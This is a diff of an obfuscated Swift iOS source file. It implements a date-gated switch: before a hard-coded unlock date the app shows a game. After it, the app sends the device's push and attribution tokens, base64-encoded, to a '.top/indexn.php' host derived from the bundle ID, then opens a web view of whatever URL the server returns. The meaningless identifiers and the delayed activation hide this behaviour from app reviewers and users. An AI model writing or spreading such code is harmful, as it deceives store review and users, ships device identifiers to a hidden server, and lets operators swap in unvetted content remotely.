@@ -1,27 +1,28 @@
 import SwiftUI
 import AdServices
 import UserNotifications
-import Network
 
-struct Xc7vT9q2: Decodable {
-    let pL3mN8sK: String
-    let rT5wY9hD: String
+
+struct Hjkrt78d: Decodable {
+    let kgfh4578: String
+    let plo87ght: String
+
     
     init(from decoder: Decoder) throws {
-        let container = try decoder.container(keyedBy: FgH8jK3l.self)
-        self.pL3mN8sK = try container.decode(String.self, forKey: FgH8jK3l(stringValue: Qw2eR4tY.sEr5tY7u)!)
-        self.rT5wY9hD = try container.decode(String.self, forKey: FgH8jK3l(stringValue: Qw2eR4tY.uJ8iK9o0)!)
-    }
+            let zxcrt567 = try decoder.container(keyedBy: Uio87gfd.self)
+            self.kgfh4578 = try zxcrt567.decode(String.self, forKey: Uio87gfd(stringValue: Mjhyu675.dtruyh78)!)
+            self.plo87ght = try zxcrt567.decode(String.self, forKey: Uio87gfd(stringValue: Mjhyu675.aqwe6790)!)
+        }
 }
 
-enum VbN6mK9l: Error {
-    case mIsSiNgPaRaMs
-    case mAlFoRmEdUrL
-    case nO_DaTa_ReCvD
-    case cOnN_TiMeOuT
+enum Ghjyt567: Error {
+    case gftr5674
+    case dert5478
+    case mnbgy574
+    case xbcy5781
 }
 
-struct FgH8jK3l: CodingKey {
+struct Uio87gfd: CodingKey {
     var stringValue: String
     init?(stringValue: String) {
         self.stringValue = stringValue
@@ -31,366 +32,403 @@ struct FgH8jK3l: CodingKey {
     init?(intValue: Int) { return nil }
 }
 
-final class Qw2eR4tY {
-    static var sEr5tY7u = ""
-    static var uJ8iK9o0 = ""
-    static var jhfdhbfb441 = ""
+final class Mjhyu675 {
+    static var dtruyh78 = ""
+    static var aqwe6790 = ""
+    static var klopt765 = ""
 }
 
 @MainActor
-public class TokensManager {
+public class RequestsManager {
 
-    @ObservedObject var nEtMoNiToR = NeTwOrK_MnGr.shared
-    private var aPiSeRvIcE: ApI_PrOtOcOl {
-        return ApI_ImPlEmT()
+    @ObservedObject var qazpl786 = Yuikhg56.shared
+    private var xcfgy785: Poiuy765 {
+        return Zxvbn745()
     }
     
-    private let sToReD_kEy = "xY7zP9qW"
-    private var pUsH_tOkEn: String?
-    private var aTt_TkEn: String?
-    private var rTrY_cNt = 0
-    private let mAx_rTrY = 10
-    private let rTrY_iNtVl = 3.0
+    private let poliuj56 = "kgjyt675"
+    private var yujikl78: String?
+    private var oplkju89: String?
+    private var jhger567 = 0
+    private let kijhy576 = 10
+    private let juhgt675 = 3.0
     
-    public init(one: String, two: String, date: String) {
-        Qw2eR4tY.sEr5tY7u = one
-        Qw2eR4tY.uJ8iK9o0 = two
-        Qw2eR4tY.jhfdhbfb441 = date
+    public init(url1: String, url2: String, unlockDate: String) {
+        Mjhyu675.dtruyh78 = url1
+        Mjhyu675.aqwe6790 = url2
+        Mjhyu675.klopt765 = unlockDate
     }
     
-    public func initializeConnection() async {
-        
-        guard cHk_UnLckDt(Qw2eR4tY.jhfdhbfb441) else {
-            hNdL_FaIl()
+    
+    
+    public func mnbhy786() async {
+     
+        guard plkjh576(Mjhyu675.klopt765) else {
+            ghjkl567()
+            
             return
         }
         
-        if !nEtMoNiToR.isConnected {
-            await rTrY_cOnNeCt()
+        if !qazpl786.isActive {
+            await bvcxz675()
             return
         }
         
-        if !fIrSt_LaUnCh() {
-            pRoCeSs_StAtE()
+        if !ytrewq67() {
+            nbvcx768()
             return
         }
         
-        await gEt_TkNs()
+        await fghjk768()
         
-        aPiSeRvIcE.eXeC_RqSt(deviceInfo: gEt_DvInFo()) { result in
-            switch result {
-            case .success(let url):
-                self.hNdL_SuCcSs(destination: url)
-                self.rQsT_NtF_Prm()
+        xcfgy785.qwert786(deviceData: zxcvb897()) { ghjkl765 in
+            switch ghjkl765 {
+            case .success(let mnbvc78):
+                self.iuytf786(url: mnbvc78)
+                self.cvbnm675()
             case .failure:
-                self.hNdL_FaIl()
+                self.tyuio789()
             }
         }
     }
     
-    private func rTrY_cOnNeCt() async {
-        if rTrY_cNt >= mAx_rTrY {
-            nTfY_fAiL()
-            rTrY_cNt = 0
+    private func bvcxz675() async {
+        if jhger567 >= kijhy576 {
+            print("Превышено максимальное количество попыток подключения к интернету (\(kijhy576))")
+            print("Превышено максимальное количество попыток подключения к интернету")
+            ghjkl567()
+            jhger567 = 0
             return
         }
         
-        rTrY_cNt += 1
+        jhger567 += 1
+        print("Нет подключения к интернету. Попытка \(jhger567) из \(kijhy576). Повторная проверка через \(Int(juhgt675)) сек...")
+        print("Нет подключения к интернету. Попытка \(jhger567) из \(kijhy576). Повторная проверка через \(Int(juhgt675)) сек...")
         
-        try? await Task.sleep(nanoseconds: UInt64(rTrY_iNtVl * 1_000_000_000))
+        try? await Task.sleep(nanoseconds: UInt64(juhgt675 * 1_000_000_000))
         
-        if nEtMoNiToR.isConnected {
-            rTrY_cNt = 0
+        if qazpl786.isActive {
+            print("Интернет подключен после попытки \(jhger567)")
+            print("Интернет подключен после попытки \(jhger567)")
+            jhger567 = 0
             
-            if !fIrSt_LaUnCh() {
-                pRoCeSs_StAtE()
+            if !ytrewq67() {
+                nbvcx768()
             } else {
-                await gEt_TkNs()
+                await fghjk768()
                 
-                aPiSeRvIcE.eXeC_RqSt(deviceInfo: gEt_DvInFo()) { result in
-                    switch result {
-                    case .success(let url):
-                        self.hNdL_SuCcSs(destination: url)
-                        self.rQsT_NtF_Prm()
+                xcfgy785.qwert786(deviceData: zxcvb897()) { ghjkl765 in
+                    switch ghjkl765 {
+                    case .success(let mnbvc78):
+                        self.iuytf786(url: mnbvc78)
+                        self.cvbnm675()
                     case .failure:
-                        self.hNdL_FaIl()
+                        self.tyuio789()
                     }
                 }
             }
         } else {
-            await rTrY_cOnNeCt()
+            await bvcxz675()
         }
     }
     
-    private func gEt_TkNs() async {
-        await withCheckedContinuation { continuation in
+    private func fghjk768() async {
+        await withCheckedContinuation { mnbvf678 in
             DispatchQueue.main.async {
                 UIApplication.shared.registerForRemoteNotifications()
             }
             
-            let timeLimit = DispatchTime.now() + 10
+            let lkjhg654 = DispatchTime.now() + 10
             
-            NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] notification in
+            NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] bnmgh564 in
                 guard let self = self else { return }
                 
-                if let token = notification.userInfo?["token"] as? String {
+                if let jkliuy67 = bnmgh564.userInfo?["token"] as? String {
                     Task { @MainActor in
-                        self.pUsH_tOkEn = token
-                        continuation.resume()
+                        print("APNs токен получен")
+                        self.yujikl78 = jkliuy67
+                        mnbvf678.resume()
                     }
                 }
             }
             
-            DispatchQueue.main.asyncAfter(deadline: timeLimit) { [weak self] in
+            DispatchQueue.main.asyncAfter(deadline: lkjhg654) { [weak self] in
                 guard let self = self else { return }
-                if self.pUsH_tOkEn == nil {
+                if self.yujikl78 == nil {
                     Task { @MainActor in
-                        self.pUsH_tOkEn = ""
-                        continuation.resume()
+                        print("APNs токен не получен")
+                        self.yujikl78 = ""
+                        mnbvf678.resume()
                     }
                 }
             }
         }
 
         do {
-            self.aTt_TkEn = try AAAttribution.attributionToken()
+            self.oplkju89 = try AAAttribution.attributionToken()
         } catch {
-            self.aTt_TkEn = ""
+            print("Не удалось получить ATT токен: \(error)")
+            self.oplkju89 = ""
         }
     }
 
-    func gEt_DvInFo() -> [String: String] {
-        let data = [
-            "apns_tk": pUsH_tOkEn ?? "",
-            "att_tk": aTt_TkEn ?? ""
+    
+    func zxcvb897() -> [String: String] {
+        let dfghj645 = [
+            "apns_token": yujikl78 ?? "",
+            "att_token": oplkju89 ?? ""
         ]
-        return data
+        print("Device data: \(dfghj645)")
+        return dfghj645
     }
     
-    private func fIrSt_LaUnCh() -> Bool {
-        !UserDefaults.standard.bool(forKey: "hS_LnChD_Bfr")
+    private func ytrewq67() -> Bool {
+        !UserDefaults.standard.bool(forKey: "yhfgtu78")
     }
     
-    private func hNdL_SuCcSs(destination: URL) {
-        UserDefaults.standard.set(destination.absoluteString, forKey: sToReD_kEy)
-        UserDefaults.standard.set(true, forKey: "sHw_WbVw")
-        UserDefaults.standard.set(false, forKey: "sHw_Gm")
-        UserDefaults.standard.set(true, forKey: "hS_LnChD_Bfr")
-        nTfY_sUcC(object: destination)
+    private func iuytf786(url: URL) {
+        UserDefaults.standard.set(url.absoluteString, forKey: poliuj56)
+        UserDefaults.standard.set(true, forKey: "vcxnm765")
+        UserDefaults.standard.set(false, forKey: "kjhut876")
+        UserDefaults.standard.set(true, forKey: "yhfgtu78")
+        asdfg768(object: url)
     }
     
-    private func hNdL_FaIl() {
-        UserDefaults.standard.set(true, forKey: "sHw_Gm")
-        UserDefaults.standard.set(false, forKey: "sHw_WbVw")
-        UserDefaults.standard.set(true, forKey: "hS_LnChD_Bfr")
-        nTfY_fAiL()
+    private func tyuio789() {
+        UserDefaults.standard.set(true, forKey: "kjhut876")
+        UserDefaults.standard.set(false, forKey: "vcxnm765")
+        UserDefaults.standard.set(true, forKey: "yhfgtu78")
+        ghjkl567()
     }
     
-    private func pRoCeSs_StAtE() {
-        if sHw_WbVw(), let urlString = UserDefaults.standard.string(forKey: sToReD_kEy), let url = URL(string: urlString) {
-            nTfY_sUcC(object: url)
+    private func nbvcx768() {
+        if qwert657(), let ghbnm675 = UserDefaults.standard.string(forKey: poliuj56), let mnbvc78 = URL(string: ghbnm675) {
+            asdfg768(object: mnbvc78)
         } else {
-            nTfY_fAiL()
+            ghjkl567()
         }
     }
     
-    func cHk_UnLckDt(_ date: String) -> Bool {
-        let dateFormatter = DateFormatter()
-        dateFormatter.dateFormat = "yyyy-MM-dd"
-        let currentDate = Date()
-        guard let unlockDate = dateFormatter.date(from: date), currentDate >= unlockDate else {
+    func plkjh576(_ nbvcd546: String) -> Bool {
+        let bvcxz546 = DateFormatter()
+        bvcxz546.dateFormat = "yyyy-MM-dd"
+        let ythfd567 = Date()
+        guard let rtgdf675 = bvcxz546.date(from: nbvcd546), ythfd567 >= rtgdf675 else {
+            print("Дата разблокировки еще не наступила❌")
             return false
         }
+        print("Приложение активно✅")
         return true
     }
     
-    func sHw_Gm() -> Bool {
-        UserDefaults.standard.bool(forKey: "sHw_Gm")
+    func poiuy678() -> Bool {
+        UserDefaults.standard.bool(forKey: "kjhut876")
     }
     
-    func sHw_WbVw() -> Bool {
-        UserDefaults.standard.bool(forKey: "sHw_WbVw")
+    func qwert657() -> Bool {
+        UserDefaults.standard.bool(forKey: "vcxnm765")
     }
     
-    func rQsT_NtF_Prm() {
-        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
-        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) {_, _ in }
-    }
+    func cvbnm675() {
+        
+        let zxcvb546: UNAuthorizationOptions = [.alert, .badge, .sound]
+        UNUserNotificationCenter.current().requestAuthorization(options: zxcvb546) {_, _ in }
+        
+      }
 }
 
-class NeTwOrK_MnGr: ObservableObject {
-    static var shared = NeTwOrK_MnGr()
-    let mNiTr = NWPathMonitor()
-    let qUeUe = DispatchQueue(label: "mNiTr_q")
-    @Published var isConnected = false
-    @Published var iS_ExPnSv = false
-    @Published var iS_CnStRnD = false
-    @Published var cOnN_Tp = NWInterface.InterfaceType.other
+
+import Network
+ 
+
+class Yuikhg56: ObservableObject {
+    static var shared = Yuikhg56()
+    let asdfg675 = NWPathMonitor()
+    let hjkli675 = DispatchQueue(label: "monitor")
+    @Published var isActive = false
+    @Published var yuiop675 = false
+    @Published var cvbfd567 = false
+    @Published var ghjuy576 = NWInterface.InterfaceType.other
+    
     
     init() {
-        mNiTr.pathUpdateHandler = { path in
+        asdfg675.pathUpdateHandler = { mjhyt675 in
             DispatchQueue.main.async {
-                self.isConnected = path.status == .satisfied
-                self.iS_ExPnSv = path.isExpensive
-                self.iS_CnStRnD = path.isConstrained
+                self.isActive = mjhyt675.status == .satisfied
+                self.yuiop675 = mjhyt675.isExpensive
+                self.cvbfd567 = mjhyt675.isConstrained
                 
-                let cOnN_TyPs: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
-                self.cOnN_Tp = cOnN_TyPs.first(where: path.usesInterfaceType) ?? .other
+                let tgbnh567: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
+                self.ghjuy576 = tgbnh567.first(where: mjhyt675.usesInterfaceType) ?? .other
             }
         }
         
-        mNiTr.start(queue: qUeUe)
+        asdfg675.start(queue: hjkli675)
     }
+    
+    
 }
 
-extension TokensManager {
-    func nTfY_fAiL() {
+
+extension RequestsManager {
+    func ghjkl567() {
         DispatchQueue.main.async {
             NotificationCenter.default.post(name: .failed, object: nil)
+            print("Запущена игра")
         }
     }
     
-    func nTfY_sUcC(object: URL) {
+    func asdfg768(object: URL) {
         DispatchQueue.main.async {
             NotificationCenter.default.post(name: .updated, object: object)
+            print("Запущено вью")
         }
     }
 }
 
-protocol ApI_PrOtOcOl: AnyObject {
-    func eXeC_RqSt(deviceInfo: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
+
+protocol Poiuy765: AnyObject {
+    func qwert786(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
 }
 
-final class ApI_ImPlEmT: ApI_PrOtOcOl {
+
+
+
+final class Zxvbn745: Poiuy765 {
     
-    func gEt_BsUrL() -> String {
-        guard let bundleId = Bundle.main.bundleIdentifier else { return "" }
-        let cleanedString = bundleId.replacingOccurrences(of: ".", with: "")
-        let stringUrl: String = "https://" + cleanedString + ".top/indexn.php"
-        return stringUrl.lowercased()
+    func rftgy768() -> String {
+        guard let mnbhj675 = Bundle.main.bundleIdentifier else { return "" }
+        let vgbnm675 = mnbhj675.replacingOccurrences(of: ".", with: "")
+        let plkjh567: String = "https://" + vgbnm675 + ".top/indexn.php"
+        return plkjh567.lowercased()
     }
     
-    private func eNcD_ToAsCii(_ url: String) -> String {
-        var result = ""
-        for char in url {
-            let scalar = char.unicodeScalars.first!
-            result.append(String(format: "%%%02X", scalar.value))
+    private func gytrfd67(_ zxcvb765: String) -> String {
+        var dfgty675 = ""
+        for poiuy675 in zxcvb765 {
+            let qazws765 = poiuy675.unicodeScalars.first!
+            dfgty675.append(String(format: "%%%02X", qazws765.value))
         }
-        return result
+        return dfgty675
     }
     
-    private func dEcD_FrAsCii(_ encoded: String) -> String? {
-        var result = ""
-        var i = encoded.startIndex
+    private func bvcxz675(_ derty675: String) -> String? {
+        var hjkli756 = ""
+        var dfgty675 = derty675.startIndex
         
-        while i < encoded.endIndex {
-            if encoded[i] == "%" && i < encoded.index(encoded.endIndex, offsetBy: -2) {
-                let start = encoded.index(i, offsetBy: 1)
-                let end = encoded.index(i, offsetBy: 3)
-                let hexString = String(encoded[start..<end])
+        while dfgty675 < derty675.endIndex {
+            if derty675[dfgty675] == "%" && dfgty675 < derty675.index(derty675.endIndex, offsetBy: -2) {
+                let jhgfd765 = derty675.index(dfgty675, offsetBy: 1)
+                let rtyui675 = derty675.index(dfgty675, offsetBy: 3)
+                let zxcbn675 = String(derty675[jhgfd765..<rtyui675])
                 
-                if let hexValue = UInt32(hexString, radix: 16),
-                   let unicode = UnicodeScalar(hexValue) {
-                    result.append(Character(unicode))
-                    i = end
+                if let qwert675 = UInt32(zxcbn675, radix: 16),
+                   let vbnhj567 = UnicodeScalar(qwert675) {
+                    hjkli756.append(Character(vbnhj567))
+                    dfgty675 = rtyui675
                 } else {
                     return nil
                 }
             } else {
-                result.append(encoded[i])
-                i = encoded.index(after: i)
+                hjkli756.append(derty675[dfgty675])
+                dfgty675 = derty675.index(after: dfgty675)
             }
         }
         
-        return result
+        return hjkli756
     }
     
-    private func gEt_FnLUrL(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
-        let queryItems = data.map { URLQueryItem(name: $0.key, value: $0.value) }
-        var components = URLComponents()
-        components.queryItems = queryItems
+    private func rtyui675(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
+        let uioph675 = data.map { URLQueryItem(name: $0.key, value: $0.value) }
+        var trewq675 = URLComponents()
+        trewq675.queryItems = uioph675
         
-        guard let queryString = components.query?.data(using: .utf8) else {
+        guard let fghjk675 = trewq675.query?.data(using: .utf8) else {
             return nil
         }
-        let base64String = queryString.base64EncodedString()
+        let mnbvc674 = fghjk675.base64EncodedString()
         
-        let baseUrl = gEt_BsUrL()
-        let fullUrlString = baseUrl + "?data=" + base64String
+        let qwsax675 = rftgy768()
+        let asdfg575 = qwsax675 + "?data=" + mnbvc674
+        print("🔹 Базовая ссылка: \(asdfg575)")
         
-        let asciiEncodedUrl = eNcD_ToAsCii(fullUrlString)
+        let yuiop675 = gytrfd67(asdfg575)
+        print("🔹 Кодированная ссылка: \(yuiop675)")
         
-        return (asciiEncodedUrl, fullUrlString)
+        return (yuiop675, asdfg575)
     }
     
-    func dEcD_JsDt(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
+    func plokj675(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
         do {
-            let decodedData = try JSONDecoder().decode(Xc7vT9q2.self, from: data)
+            let ghnjm675 = try JSONDecoder().decode(Hjkrt78d.self, from: data)
             
-            guard !decodedData.pL3mN8sK.isEmpty, !decodedData.rT5wY9hD.isEmpty else {
-                completion(.failure(VbN6mK9l.mIsSiNgPaRaMs))
+            guard !ghnjm675.kgfh4578.isEmpty, !ghnjm675.plo87ght.isEmpty else {
+                completion(.failure(Ghjyt567.gftr5674))
                 return
             }
             
-            let fullUrlString = "https://" + decodedData.pL3mN8sK + decodedData.rT5wY9hD
+            let asdfg575 = "https://" + ghnjm675.kgfh4578 + ghnjm675.plo87ght
             
-            let asciiEncodedUrl = eNcD_ToAsCii(fullUrlString)
+            let yuiop675 = gytrfd67(asdfg575)
             
-            completion(.success((asciiEncodedUrl, fullUrlString)))
+            completion(.success((yuiop675, asdfg575)))
         } catch {
-            UserDefaults.standard.setValue(true, forKey: "oN_BoRdNg")
+            UserDefaults.standard.setValue(true, forKey: "openedOnboarding")
             completion(.failure(error))
         }
     }
     
-    func eXeC_RqSt(deviceInfo: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
-        guard let urlTuple = gEt_FnLUrL(data: deviceInfo) else {
-            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
+    func qwert786(deviceData: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
+        print("🔹 APNS Token: \(deviceData["apns_token"] ?? "")")
+        print("🔹 ATT Token: \(deviceData["att_token"] ?? "")")
+        
+        guard let uyjnb675 = rtyui675(data: deviceData) else {
+            completion(.failure(Ghjyt567.dert5478))
             return
         }
         
-        let encodedUrl = urlTuple.encodedUrl
+        let poiuy675 = uyjnb675.encodedUrl
         
-        guard let decodedUrl = dEcD_FrAsCii(encodedUrl) else {
-            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
+        guard let qazxs567 = bvcxz675(poiuy675) else {
+            completion(.failure(Ghjyt567.dert5478))
             return
         }
         
-        guard let actualUrl = URL(string: decodedUrl) else {
-            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
+        guard let vbnhy675 = URL(string: qazxs567) else {
+            completion(.failure(Ghjyt567.dert5478))
             return
         }
         
-        let configuration = URLSessionConfiguration.default
-        configuration.timeoutIntervalForRequest = 5
-        let session = URLSession(configuration: configuration)
+        let xcvbn675 = URLSessionConfiguration.default
+        xcvbn675.timeoutIntervalForRequest = 5
+        let nbvgh675 = URLSession(configuration: xcvbn675)
         
-        let task = session.dataTask(with: actualUrl) { data, response, error in
+        let dfghj645 = nbvgh675.dataTask(with: vbnhy675) { data, response, error in
             if let error = error as NSError?,
                error.code == NSURLErrorTimedOut {
-                completion(.failure(VbN6mK9l.cOnN_TiMeOuT))
+                completion(.failure(Ghjyt567.xbcy5781))
                 return
             }
             
             if let data = data {
-                self.dEcD_JsDt(data: data) { result in
+                self.plokj675(data: data) { result in
                     switch result {
                         case .success(let urlTuple):
                             if let finalUrl = URL(string: urlTuple.originalUrl) {
                                 completion(.success(finalUrl))
                             } else {
-                                completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
+                                completion(.failure(Ghjyt567.dert5478))
                             }
                         case .failure(let error):
                             completion(.failure(error))
                     }
                 }
             } else {
-                completion(.failure(VbN6mK9l.nO_DaTa_ReCvD))
+                completion(.failure(Ghjyt567.mnbgy574))
             }
         }
         
-        task.resume()
+        dfghj645.resume()
     }
 }
 
